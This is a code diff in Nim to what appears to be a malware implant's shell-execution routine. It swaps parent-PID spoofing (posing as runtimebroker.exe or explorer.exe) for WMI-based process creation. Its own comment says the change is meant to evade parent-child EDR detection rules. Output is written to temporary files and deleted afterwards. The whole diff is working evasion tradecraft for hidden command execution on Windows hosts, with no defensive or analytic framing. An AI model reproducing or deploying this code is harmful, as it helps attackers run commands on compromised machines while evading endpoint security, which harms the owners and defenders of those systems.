@@ -220,54 +220,42 @@ proc runShell*(cmd: string): string =
   except: return "[error: " & getCurrentExceptionMsg() & "]"
 
 proc runShellOpsec*(cmd: string): string =
+  ## Executes cmd via WMI Win32_Process.Create so the spawned process is a
+  ## child of WmiPrvSE.exe, not of this agent — evades parent-child EDR rules.
   when defined(windows):
-    var parentPid: DWORD = 0
-    let snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
-    if snap != INVALID_HANDLE_VALUE:
-      var pe: PROCESSENTRY32W
-      pe.dwSize = sizeof(pe).DWORD
-      if Process32FirstW(snap, addr pe).bool:
-        while true:
-          let name = ($cast[WideCString](addr pe.szExeFile[0])).toLowerAscii()
-          if name == "runtimebroker.exe":
-            parentPid = pe.th32ProcessID
-            break
-          elif parentPid == 0 and name == "explorer.exe":
-            parentPid = pe.th32ProcessID
-          if not Process32NextW(snap, addr pe).bool: break
-      discard CloseHandle(snap)
-    if parentPid == 0: return runShell(cmd)
-    let hParent = OpenProcess(PROCESS_CREATE_PROCESS, 0, parentPid)
-    if hParent == 0: return runShell(cmd)
-    defer: discard CloseHandle(hParent)
-    let outPath = "C:\\Windows\\Temp\\sbo" & $GetCurrentProcessId() & $GetTickCount() & ".tmp"
-    let cmdLine = "cmd.exe /d /c " & cmd & " > \"" & outPath & "\" 2>&1"
-    var siEx: STARTUPINFOEXW
-    siEx.StartupInfo.cb = sizeof(siEx).DWORD
-    siEx.StartupInfo.dwFlags = STARTF_USESHOWWINDOW
-    siEx.StartupInfo.wShowWindow = 0
-    var attrSize: SIZE_T
-    discard InitializeProcThreadAttributeList(nil, 1, 0, addr attrSize)
-    let attrList = cast[LPPROC_THREAD_ATTRIBUTE_LIST](HeapAlloc(GetProcessHeap(), 0, attrSize))
-    defer: HeapFree(GetProcessHeap(), 0, attrList)
-    discard InitializeProcThreadAttributeList(attrList, 1, 0, addr attrSize)
-    discard UpdateProcThreadAttribute(attrList, 0,
-      evasion.PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
-      addr hParent, SIZE_T(sizeof(hParent)), nil, nil)
-    siEx.lpAttributeList = attrList
-    var pi: PROCESS_INFORMATION
-    let cmdW = newWideCString(cmdLine)
-    let ok = CreateProcessW(nil, cmdW, nil, nil, 0,
-      CREATE_NO_WINDOW or EXTENDED_STARTUPINFO_PRESENT,
-      nil, nil, addr siEx.StartupInfo, addr pi)
-    DeleteProcThreadAttributeList(attrList)
-    if not ok.bool: return runShell(cmd)
-    discard WaitForSingleObject(pi.hProcess, 30000)
-    discard CloseHandle(pi.hThread); discard CloseHandle(pi.hProcess)
+    let outPath = "C:\\ProgramData\\sbo" & $GetCurrentProcessId() &
+                  $GetTickCount() & ".tmp"
+    let innerCmd = "cmd.exe /d /c " & cmd & " > " & outPath & " 2>&1"
+    # Use wmic to create the process via WMI; final cmd.exe runs under WmiPrvSE.exe
+    let wmicCmd = "wmic process call create \"" & innerCmd & "\""
+    let wmicOut = runShell(wmicCmd)
+
+    # Parse PID from wmic output: "ProcessId = NNNN;"
+    var childPid: DWORD = 0
+    let marker = "ProcessId = "
+    let mIdx = wmicOut.find(marker)
+    if mIdx >= 0:
+      let rest = wmicOut[mIdx + marker.len .. ^1]
+      var pidStr = ""
+      for ch in rest:
+        if ch in {'0'..'9'}: pidStr &= ch
+        else: break
+      try: childPid = DWORD(parseInt(pidStr))
+      except: discard
+
+    if childPid > 0:
+      let hc = OpenProcess(SYNCHRONIZE, 0, childPid)
+      if hc != 0:
+        discard WaitForSingleObject(hc, 30000)
+        discard CloseHandle(hc)
+      else: sleep(8000)
+    else: sleep(8000)
+
     try:
       result = readFile(outPath)
       discard tryRemoveFile(outPath)
     except: result = "[no output]"
+    if result.len == 0: result = runShell(cmd)
   else:
     return runShell(cmd)
 
